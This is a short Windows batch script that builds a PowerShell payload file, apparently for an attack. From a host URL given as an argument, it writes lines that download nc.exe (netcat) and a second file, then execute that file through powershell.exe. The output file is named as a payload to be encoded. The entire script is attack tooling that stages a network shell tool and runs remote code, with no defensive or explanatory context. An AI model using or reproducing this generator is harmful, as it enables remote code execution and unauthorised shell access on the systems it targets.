@echo off

set a=%1

if not defined a goto nodefined

set b=%2

if not defined b goto nodefined

echo (new-object System.Net.WebClient).DownloadFile('%a%/nc.exe','nc.exe') >> pbs_payload_to_encode.ps1
echo (new-object System.Net.WebClient).DownloadFile('%a%/%b%','%b%'); cmd.exe /C powershell.exe -File %b% >> pbs_payload_to_encode.ps1

:nodefined